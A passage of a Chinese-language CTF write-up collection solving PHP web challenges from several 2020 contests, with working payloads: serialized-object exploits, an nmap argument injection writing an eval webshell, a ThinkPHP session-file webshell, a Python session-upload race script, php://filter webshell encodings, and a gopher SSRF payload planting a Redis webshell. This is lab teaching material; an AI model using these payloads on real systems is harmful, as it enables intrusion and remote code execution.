            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```
FileHandler类实现类文件的读和写，反序列化时首先会调用__destruct()函数，__destruct()会检测op值是否为'2'，如果为'2'就会令op=1，由于是===必须是类型和数值都等于'2',所以可以让op等于数字2来绕过，然后__destruct()会调用process()，process()中如果op值为2将会执行read()函数，会读取fliename的文件，所以我们需要将`$op=2，$filename='flag.php'`进行序列化

protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。

### 解法一：
php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可
```php
<?php

class FileHandler{
    public $op=2;
    public $filename="flag.php";
    public $content;

}
$a = new FileHandler();
echo  urlencode(serialize($a));
//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D
```
传入，查看源代码即可得到flag
![](https://img-blog.csdnimg.cn/20200526125022861.png)
### 解法二：
反序列化之前会做逐字判断，ascii必须>=32或<=125。由于这里是protected类型，需要加上%00进行标识
但是%会被过滤，就用十六进制\00和S来绕过。
```php
<?php
class FileHandler{
    protected $op=2;
    protected $filename="flag.php";
}
// echo urlencode(serialize(new FileHandler));

$a = serialize(new FileHandler);
// echo $a;
$a = str_replace(chr(0),'\00',$a);
$a = str_replace('s:','S:',$a);

echo urlencode($a);

?>
//O%3A11%3A%22FileHandler%22%3A2%3A%7BS%3A5%3A%22%5C00%2A%5C00op%22%3Bi%3A2%3BS%3A11%3A%22%5C00%2A%5C00filename%22%3BS%3A8%3A%22flag.php%22%3B%7D
```

在网鼎杯中需要读取文件绝对路径，需要`/proc/self/cmdline`，然后得到配置文件路径`/web/config/httpd.conf`

参考：[2020-网鼎杯(青龙组)-Web题目-AreUserialz Writeup](https://zhuanlan.zhihu.com/p/141372339)
[第二届网鼎杯（青龙组）部分wp](https://www.anquanke.com/post/id/204856)
[网鼎杯2020青龙组 web writeup](https://www.cnblogs.com/W4nder/p/12866365.html)


## [网鼎杯 2020 朱雀组]phpweb
首先进入题，发现页面再一直重复刷新，那么抓包看看
![](https://img-blog.csdnimg.cn/20200526154649290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
我们发现func参数调用了函数date()，p参数调用了函数date中填写的时间格式，我们尝试构造一下`readfile("index.php")`，这里还可以使用`file_get_contents`，然后查看能否代码执行，尝试读取index.php的文件
![](https://img-blog.csdnimg.cn/20200526154908671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到代码如下：
```php
<?php
$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
function gettime($func, $p) {
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") {
        return $result;
    } else {return "";}
}
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];

if ($func != null) {
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
    }else {
        die("Hacker...");
    }
}
?>
```
### 解法一
题目将我们传入的函数转化为小写，并进行过滤，但发现发现有个类会`echo gettime($this->func,$this->p);`，那么我们可以进行反序列化
```php
<?php
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
        }
$a = new Test();
$a -> func ="system";
$a -> p ="ls";
echo serialize($a);
//O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}
```
![](https://img-blog.csdnimg.cn/20200526160245575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
执行成功，那么可以使用`grep -r flag /tmp`来匹配文件夹中包含flag字符串的文件，由于我这里根目录遍历未成功，所以尝试读取tmp目录

![](https://img-blog.csdnimg.cn/20200526161756860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
还可以使用`find / -name flag*`来遍历包含flag开头的文件，也可以直接`cat $(find / -name flag*)`
$( )中放的是命令，相当于``
![](https://img-blog.csdnimg.cn/20200526162546384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
找到之后cat一下就可以了`cat /tmp/flagoefiu4r93`

### 解法二
看到了一篇wp，我又涨姿势了，tql，为**命名空间绕过黑名单**，测试了一下，可行
![](https://img-blog.csdnimg.cn/20200526174454458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
使用`\system`来绕过，然后直接执行命令即可！！！
![](https://img-blog.csdnimg.cn/20200526173814294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这里还是bp抓包来做，因为页面会不断刷新，我这偷懒了。。。
![](https://img-blog.csdnimg.cn/20200526174129864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[2020网鼎杯朱雀组WEB——NMAP&PHPWEB](https://blog.csdn.net/Pdsdt1/article/details/106199660/)
[2020网鼎杯朱雀组部分Web题wp](https://www.anquanke.com/post/id/205679)


## [网鼎杯 2020 朱雀组]Nmap
学习nmap：[nmap命令详解](https://blog.csdn.net/yalecaltech/article/details/70943898)
之前buuctf上有一个利用namp中的-oG写入文件的escapeshellarg()和escapeshellcmd()漏洞，这里也是利用namp，那么可以尝试直接上payload：`'<?php @eval($_POST["pass"]); ?> -oG 1.php '`
![](https://img-blog.csdnimg.cn/20200526165443511.png)
很明显有过滤，测试后发现为php被过滤了，盲猜一波开启了short_open_tag，使用短标签，`=`绕过文件中的php字符，使用`phtml`绕过对`php`文件后缀的检测(<?=这也可以不加=)
```php
'<?= @eval($_POST["pass"]);?> -oG 1.phtml '
```
![](https://img-blog.csdnimg.cn/20200526170410970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
又看了另一篇wp，师傅太顶了，发现可以使用-iL，那么去查一下是什么
**-iL：使用-iL选项从一个包含主机名或IP地址列表的文件中读取目标主机**
**-oN：把扫描结果重定向到一个可读的文件logfilename中**
师傅的payload：`127.0.0.1' -iL /flag -oN vege.txt '`

![](https://img-blog.csdnimg.cn/20200526172723570.png)
参考：
[【网鼎杯2020朱雀组】Web WriteUp](https://www.cnblogs.com/vege/p/12907941.html)
[2020网鼎杯朱雀组部分Web题wp](https://www.anquanke.com/post/id/205679)


## [GYCTF]EasyThinking

随便输入一些，发现报错信息为ThinkPHPV6.0.0，使用搜索引擎[ThinkPHP6 任意文件操作漏洞分析](https://paper.seebug.org/1114/)
![](https://img-blog.csdnimg.cn/20200819163037137.png#pic_center)
接下来看了wp后发现要使用dirsearch扫描目录，得到`www.zip`
漏洞在**app/home/controller/Member.php**
本题中我们搜索的内容即为session中的内容，师傅的思路：
>1.注册一个用户
2.登录用户，登陆时Burp抓包修改PHP_SESSION=`<长度为32位的字符串(即文件名)>` 这里需要写成php文件来让服务器解析，因此构造成0123456789012345678912345678.php即可满足条件（文件名28位数字+".php"拓展名4位字符串，长度共32位，满足SESSION条件）
3.在搜索框输入Shell（即向0123456789012345678912345678.php写入的内容）并且搜索
4.这里需要知道的是SESSION文件通常以sess_<值>的形式来储存，我们在提交完Shell内容之后可以在`/runtime/session/sess_0123456789012345678912345678.php`中得到我们的Shell

首先注册一个账号，然后在登录的时候抓包
![](https://img-blog.csdnimg.cn/20200819165209961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)在搜索框中写入php一句话`<?php @eval($_POST['a']); ?>`
![](https://img-blog.csdnimg.cn/20200821184116946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
最后访问我们的session文件即可，试着执行一下
![](https://img-blog.csdnimg.cn/20200821184322311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

然后连接上蚁剑，发现有disabledisable_function，需要绕过，使用[PHP 7.0-7.4 disable_functions bypass](https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)
![](https://img-blog.csdnimg.cn/2020081917295863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)最后上传，读取即可
![](https://img-blog.csdnimg.cn/20200819174224530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/2020081917424174.png#pic_center)

参考链接：
[[BUUOJ记录] [GYCTF]EasyThinking](https://www.cnblogs.com/yesec/p/12571861.html)
[学习笔记32.[GYCTF2020]EasyThinking](https://www.jianshu.com/p/6a113254a325)

## [WMCTF2020]Make PHP Great Again

### 方法一
>PHP最新版的小Trick，require_once 包含的软链接层数较多时once的hash匹配会直接失效造成重复包含。

```php
?file=php://filter/read=convert.base64-encode/resource=file:///proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```
即可得到flag的base64编码，解码即可
![](/bmth_blog/images/pasted-0.png)

### 方法二
利用`session.upload_progress`将恶意语句写入session文件，从而包含session文件然后进行访问`/tmp/sess_xxx`,进行文件包含
>**问题一:**
代码里没有session_start(),如何创建session文件呢?
**解答一**
其实，如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。
但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。
**问题二:**
但是问题来了，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空，
如何进行rce呢？
**解答二**
此时我们可以利用竞争，在session文件内容清空前进行包含利用。

参考：[利用session.upload_progress进行文件包含和反序列化渗透 ](https://www.freebuf.com/vuls/202819.html)

python脚本如下：
```python
import io
import requests
import threading
sessID = 'flag'
url = 'http://a7646920-aa2f-46f4-bd43-00e8be7a1c6e.node3.buuoj.cn/'
def write(session):
    while True:
        f = io.BytesIO(b'a'*256*1) #建议正常这个填充数据大一点
        response = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat *.php");?>'},
            files={'file': ('a.txt', f)}
            )
def read():
    while True:
        response = session.get(url+'?file=/tmp/sess_{}'.format(sessID))
        if 'flag{' in response.text:
            print(response.text)
            break
session = requests.session()
write = threading.Thread(target=write, args=(session,))
write.daemon = True #当daemon为True时，父线程在运行完毕后，子线程无论是否正在运行，都会伴随主线程一起退出。
write.start()
read()
```
![](/bmth_blog/images/pasted-1.png)

得到了flag

参考：
[WMCTF 2020官方WriteUp](https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md)
[wmctf2020 Make PHP Great Again](https://www.cnblogs.com/hello-py/articles/13508359.html)
## [WMCTF2020]Web Check in 2.0

最开始看到这个题很有意思，就本地复现了一下，现在看到赵总搞在了buuctf上，打算再看看，赵总nb！！！

题目给出了源码
```php
 <?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = '/var/www/html/sandbox/' . md5($_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
var_dump("Sandbox:".$sandbox);
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

### 二次编码绕过

>file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的，不过我们在服务端ban了%25（用%25太简单了）所以测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。知道可以用二次编码绕过了，可以简单构造一下payload即可

构造二次编码的脚本：(也可以url编码使用%25)
```php
<?php
$char = 'r'; #构造r的二次编码
for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
	for ($ascii2 = 0; $ascii2 < 256; $ascii2++) {
		$aaa = '%'.$ascii1.'%'.$ascii2;
		if(urldecode(urldecode($aaa)) == $char){
			echo $char.': '.$aaa;
			echo "\n";
		}
	}
}
?>
```
得到：
r: %7%32
U: %5%35
i: %6%39
b: %6%32


**使用string.rot13：**
```php
php://filter/write=string.%7%32ot13|<?cuc riny($_CBFG[ozgu]);?>|/resource=bmth.php
```
![](/bmth_blog/images/pasted-2.png)
成功绕过检测，放入webshell，本地测试的时候生成代码如下：
![](/bmth_blog/images/pasted-3.png)

需要服务器**没有开启短标签**的时候才可以使用（默认情况是没开启php.ini中的short_open_tag（再补充一下，linux下默认是没有开启的，windows下默认开启）） 

**使用iconv字符编码转换**
通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上） 
```php
php://filter/convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pe@av(l_$OPTSb[tm]h;)>?/resource=bmth.php
```
本地测试生成代码如下：
![](/bmth_blog/images/pasted-4.png)

 可以进行usc-4编码转化；就是4位一反转；类比可知，构造的shell代码应该是usc-4中的4倍数
```php
php://filter/convert.%6%39conv.%5%35CS-4LE.%5%35CS-4BE|aahp?<e@ p(lavOP_$b[TS]htm>?;)/resource=bmth.php
```
生成代码如下：
![](/bmth_blog/images/pasted-5.png)

**utf-8与utf-7之间的转化，加上base64编码**
```php
php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydibXRoJ10pOz8+|convert.%6%39conv.%5%35tf-8.%5%35tf-7|convert.%6%32ase64-decode/resource=bmth.php
```
![](/bmth_blog/images/pasted-6.png)

**用UCS-2和rot13 组合**
```php
php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|string.%7%32ot13|a?%3Cuc%20cr@ni(y_$BCGFo[gz]u;)%3E?/resource=bmth.php
```
![](/bmth_blog/images/pasted-7.png)

### 过滤器绕过

>`php:filter`支持使用多个过滤器，参考官方文档 [可用过滤器列表](https://www.php.net/manual/zh/filters.php)，还留下了**字符串过滤器中的部分**和**压缩过滤器**以及**加密过滤器**，所以可以考虑从这几个过滤器入手，最好用的应该就是`zlib`的`zlib.deflate`和`zlib.inflate`，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit
```php
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0Deval($_GET[1]);?>/resource=bmth.php
```
![](/bmth_blog/images/pasted-8.png)

也是可以通过构造单个 zlib.inflate 解压字符，通过 zlib.deflate 压缩来构造shell


参考：
[WMctf2020 Checkin出题想法&题解](https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/)
[ file_put_content和死亡·杂糅代码之缘 ](https://xz.aliyun.com/t/8163)
[关于file_put_contents的一些小测试 ](https://cyc1e183.github.io/2020/04/03/关于file_put_contents的一些小测试/)

## [GKCTF2020]EZ三剑客-EzWeb
查看源码发现给出了提示
![](/bmth_blog/images/pasted-145.png)
得到有用信息
```
eth0      Link encap:Ethernet  HWaddr 02:42:0a:0a:05:09  
          inet addr:10.10.5.9  Bcast:10.10.5.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1
          RX packets:106 errors:0 dropped:0 overruns:0 frame:0
          TX packets:105 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:19291 (19.2 KB)  TX bytes:20587 (20.5 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:ac:12:00:3b  
          inet addr:172.18.0.59  Bcast:172.18.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:11 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:866 (866.0 B)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```
尝试一下file协议读文件，发现有过滤，使用`file：/`或者`file:<空格>///`即可绕过，读取源码
![](/bmth_blog/images/pasted-146.png)
```php
<?php
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}

if(isset($_GET['submit'])){
		$url = $_GET['url'];
		//echo $url."\n";
		if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match))
		{
			//var_dump($match);
			die('别这样');
		}
		curl($url);
}
if(isset($_GET['secret'])){
	system('ifconfig');
}
?>
```
发现过滤了file，dict协议，使用http协议进行内网主机存活探测，使用bp进行爆破，注意buu有限制，1秒访问10次
![](/bmth_blog/images/pasted-147.png)
发现10.10.5.11存在提示，那么我们需要爆破端口，康康有哪些服务，发现开放了6379端口
![](/bmth_blog/images/pasted-148.png)
是redis服务，利用redis未授权访问的漏洞，直接使用gopher一把梭
![](/bmth_blog/images/pasted-149.png)
```
gopher://10.10.5.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```
最后执行`?url=http://10.10.5.11/shell.php?cmd=cat${IFS}/flag`
![](/bmth_blog/images/pasted-150.png)

## [Zer0pts2020]Can you guess it?
点击source即可获取源码
```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
```
>secret由`bin2hex(random_bytes(64))`生成，如果这个值匹配就能得到flag，但看下PHP文档就知道这不太现实，我们可以知道flag在config.php内，但正则匹配ban掉了config.php
注意到`highlight_file(basename($_SERVER['PHP_SELF']));`，这里很可疑，basename是一个返回指定路径文件名的函数，`$_SERVER['PHP_SELF']`是当前正在执行的脚本的文件名，这里是用于显示自身源码
但是，为什么开头有一个检查，要求`$_SERVER['PHP_SELF']`不是以config.php结尾的字符串。这是因为，如果访问的是`/index.php/config.php`(运行的是index.php), 这种情况下`$_SERVER['PHP_SELF']`是`/index.php/config.php`,但basename返回的是config.php,因此highlight_file会将config.php的内容显示出来。也就是说，如果绕过了这个检查，我们就能够得到flag

可以用%0d之类的来污染绕过，这样仍然访问得到index.php
```
/index.php/config.php/%0d
```
![](/bmth_blog/images/pasted-151.png)
这里找到一个漏洞:[Bug #62119 basename broken with non-ASCII-chars](https://bugs.php.net/bug.php?id=62119),它会去掉文件名开头的非ASCII值，那么最终payload：
```
/index.php/config.php/%ff?source
```
![](/bmth_blog/images/pasted-152.png)

参考：[[Zer0pts2020]Can you guess it?](https://blog.csdn.net/qq_43801002/article/details/105835367)

## [BJDCTF2020]EzPHP
查看源码发现
![](/bmth_blog/images/pasted-154.png)
发现`GFXEIM3YFZYGQ4A=`base32解码为`1nD3x.php`
![](/bmth_blog/images/pasted-155.png)
访问即可获取源代码
```php
 <?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
fxck you! I hate English!
```
### 考点1：绕过QUERY_STRING的正则匹配
```php
if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}
```
由于`$_SERVER['QUERY_STRING']`不会进行URLDecode，而`$_GET[]`会，所以只要进行url编码即可绕过
### 考点2：绕过aqua_is_cute的正则匹配
```php
if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    }
```
`/^aqua_is_cute$/`中`^`匹配起始、`$`匹配结束，但又不能是`aqua_is_cute`
对于这种正则匹配，可以使用`%0a`换行污染绕过
### 考点3：绕过$\_REQUEST的字母匹配
```php
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 
```
`foreach`循环遍历`$_REQUEST`数组，将键值赋给`$value`，然后检测`$value`是否包含字母，若是，则die()
[简析GXY_CTF “Do you know Robots?”PHP反序列化](https://www.gem-love.com/ctf/571.html)
`$_REQUEST`同时接受GET和POST的数据，并且POST具有更高的优先值
>variables_order = "GPCS"
这个指令决定了当PHP启动时注册哪些超全局数组。G,P,C,E,S分别是以下超全局数组的缩写：GET, POST, COOKIE, ENV, SERVER. 注册这些数组需要在性能上付出代价，而且因为ENV不像其他的那样通用，不推荐将ENV用在生产服务器上。如果需要的话，你仍然可以通过getenv()来访问这些环境变量。
默认的优先级ENV<GET<POST<COOKIE<SERVER   
>request_order = "GP"
此指令确定哪些超级全局数据（G P C）应注册到超级全局数组REQUEST中。如果是这样，它还决定了数据注册的顺序。此指令的值以与variables_order指令相同的方式指定，只有一个除外。将此值保留为空将导致PHP使用variables order指令中设置的值。这并不意味着它会让super globals数组请求为空。
request的顺序：GET<POST

因此对于需要GET的一些参数，比如aqua_is_cute，只需要同时POST一个数字即可绕过
### 考点4：绕过文件内容读取的比较
```php
$file = "1nD3x.php";
if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>"); 
```
只要绕过aqua_is_cute后，`$file`变量就可控了，但是没有任何一个本地文件的内容是debu_debu_aqua，正则匹配了http又无法远程文件包含。所以需要构造出一个`$file`，使`file_get_contents()`返回题目要的字符串，使用`php://input`和`data://`都可以：
```
data://text/plain,<?php phpinfo()?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```
最后POST提交file=1绕过`$_REQUEST`，将`debu_debu_aqua`进行url编码后最后get提交：
`file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61`
或者使用base64
`file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=`
### 考点5：绕过sha1比较
```php
$shana = $_GET['shana'];
$passwd = $_GET['passwd']; 
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
} 
```
`sha1()`函数是无法处理数组的，如果`sha1()`的参数为一个数组会报Warning并返回False

最后总结一下payload：
```
?file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&debu=aqua_is_cute
&shana[]=1&passwd[]=2
```
进行URL编码为：
```
?file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%3B%62%61%73%65%36%34%2C%5A%47%56%69%64%56%39%6B%5A%57%4A%31%58%32%46%78%64%57%45%3D&%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0a&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2
```
然后POST提交`debu=1&file=1`
